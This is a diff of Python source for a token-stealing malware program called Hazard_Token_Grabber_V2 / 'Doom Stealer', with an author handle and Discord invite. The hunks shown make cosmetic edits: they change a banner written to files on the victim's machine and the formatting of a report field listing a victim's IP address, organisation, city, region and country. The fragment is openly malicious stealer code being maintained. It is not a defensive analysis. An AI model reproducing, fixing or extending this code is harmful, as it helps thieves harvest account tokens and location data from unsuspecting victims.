@@ -489,10 +489,10 @@ class Hazard_Token_Grabber_V2(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Doom Stealer made by njrx#2543 |・https://discord.gg/2udSyZfcCa \n\n")
+                                "Doom Stealer made by njrx#2543 | https://discord.gg/2udSyZfcCa \n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\nDoom Stealer made by njrx#2543 |・https://discord.gg/2udSyZfcCa")
+                                x+"\n\nDoom Stealer made by njrx#2543 | https://discord.gg/2udSyZfcCa")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -541,11 +541,11 @@ class Hazard_Token_Grabber_V2(functions):
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
-                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
-                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
-                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
-                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
+                                IP:᠎{ip.replace(" ", "᠎ ") if ip else "N/A"}
+                                Org:᠎{org.replace(" ", "᠎ ") if org else "N/A"}
+                                City:᠎{city.replace(" ", "᠎ ") if city else "N/A"}
+                                Region:᠎{region.replace(" ", "᠎ ") if region else "N/A"}
+                                Country:᠎{country.replace(" ", "᠎ ") if country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
